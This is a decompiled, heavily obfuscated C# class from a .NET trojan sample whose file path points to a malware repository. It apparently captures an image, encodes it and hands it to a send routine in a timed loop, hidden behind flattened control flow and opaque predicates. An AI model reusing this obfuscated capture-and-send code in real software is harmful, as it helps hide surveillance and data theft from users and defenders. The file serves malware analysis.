// Decompiled with JetBrains decompiler
// Type: @ԙ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;

internal static class \u0040ԙ
{
  internal static object \u0040ӓ;
  internal static object \u0040Ӕ;
  internal static bool \u0040ӕ;

  internal sealed class \u0040ӓ
  {
    public int \u0040ӓ;
    public int \u0040Ӕ;
    public \u0040Ԫ \u0040ӕ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040ӓ()
    {
      \u0040ԙ.\u0040ӓ.\u0040ӗ();
      \u0040ԙ.\u0040ӓ.\u0040Ә((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ӗ()
    {
      int num1 = 9;
      bool flag1;
      bool flag2;
      byte[] numArray;
      \u0040Ԫ ӕ;
      string str;
      bool flag3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 7:
            \u0040ԙ.\u0040ӕ = false;
            num1 = 11;
            continue;
          case 1:
          case 8:
            if (flag1)
            {
              num1 = 2;
              continue;
            }
            goto case 5;
          case 2:
          case 10:
            flag3 = !\u0040ԙ.\u0040ӕ;
            goto case 4;
          case 3:
            if (flag2)
            {
              try
              {
                Image image = (Image) \u0040ԝ.\u0040ӻ((\u0040Ԛ) \u0040ԙ.\u0040Ӕ, true);
                int num2 = 4;
                int height;
                int num3;
                int width;
                while (true)
                {
                  switch (num2)
                  {
                    case 0:
                      \u0040ԝ.\u0040ڐ(ӕ, str, numArray);
                      num2 = 9;
                      continue;
                    case 1:
                    case 7:
                      height = ((\u0040Ԛ) \u0040ԙ.\u0040Ӕ).\u0040ӕ.Height;
                      if (true)
                      {
                        num2 = 6;
                        continue;
                      }
                      goto case 5;
                    case 2:
                      ӕ = this.\u0040ӕ;
                      num2 = 0;
                      continue;
                    case 3:
                    case 8:
                      numArray = \u0040ԝ.\u0040ԯ(\u0040ԝ.\u0040\u055B(width, num3, image, height));
                      goto case 5;
                    case 4:
                      width = ((\u0040Ԛ) \u0040ԙ.\u0040Ӕ).\u0040ӕ.Width;
                      if (\u0040ԙ.\u0040ӓ.\u0040Ӛ())
                      {
                        num2 = 8;
                        continue;
                      }
                      if (\u0040ԙ.\u0040ӓ.\u0040ә())
                      {
                        num2 = 7;
                        continue;
                      }
                      goto label_26;
                    case 5:
                      str = (string) \u0040ԙ.\u0040ӓ.\u0040ӛ(557744);
                      num2 = 2;
                      continue;
                    case 6:
                      num3 = (this.\u0040ӓ + this.\u0040Ӕ) * 100 / (((\u0040Ԛ) \u0040ԙ.\u0040Ӕ).\u0040ӕ.Width + ((\u0040Ԛ) \u0040ԙ.\u0040Ӕ).\u0040ӕ.Height);
                      goto case 3;
                    case 9:
                      goto label_26;
                    default:
                      if (\u0040ԙ.\u0040ӓ.\u0040ә())
                      {
                        num2 = 5;
                        continue;
                      }
                      goto case 4;
                  }
                }
              }
              catch
              {
                \u0040ԙ.\u0040ӓ.\u0040Ӝ();
              }
label_26:
              \u0040ԙ.\u0040ӓ.\u0040ӝ(80);
              num1 = 5;
              continue;
            }
            num1 = 0;
            continue;
          case 4:
          case 6:
            if (flag3)
            {
              try
              {
                numArray = \u0040ԝ.\u0040\u0701((\u0040Ԛ) \u0040ԙ.\u0040Ӕ, true);
                int num4 = 3;
                while (true)
                {
                  switch (num4)
                  {
                    case 1:
                    case 4:
                      ӕ = this.\u0040ӕ;
                      break;
                    case 3:
                      str = (string) \u0040ԙ.\u0040ӓ.\u0040ӛ(557744);
                      \u0040ԙ.\u0040ӓ.\u0040ә();
                      num4 = \u0040ԙ.\u0040ӓ.\u0040Ӛ() ? 0 : 4;
                      continue;
                    case 5:
                      goto label_9;
                  }
                  \u0040ԝ.\u0040ڐ(ӕ, str, numArray);
                  num4 = 5;
                }
              }
              catch
              {
                \u0040ԙ.\u0040ӓ.\u0040Ӝ();
              }
label_9:
              \u0040ԙ.\u0040ӓ.\u0040ӝ(80);
              num1 = 10;
              continue;
            }
            goto case 0;
          case 5:
            flag2 = !\u0040ԙ.\u0040ӕ;
            num1 = 3;
            continue;
          case 9:
            flag1 = this.\u0040ӓ == 0 & this.\u0040Ӕ == 0;
            \u0040ԙ.\u0040ӓ.\u0040Ӛ();
            num1 = !\u0040ԙ.\u0040ӓ.\u0040ә() ? 6 : 8;
            continue;
          case 11:
            goto label_29;
          default:
            num1 = 7;
            continue;
        }
      }
label_29:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӗ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ә(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ә() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ӛ() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӛ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӝ() => GC.Collect();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӝ(int _param0) => Thread.Sleep(_param0);
  }
}
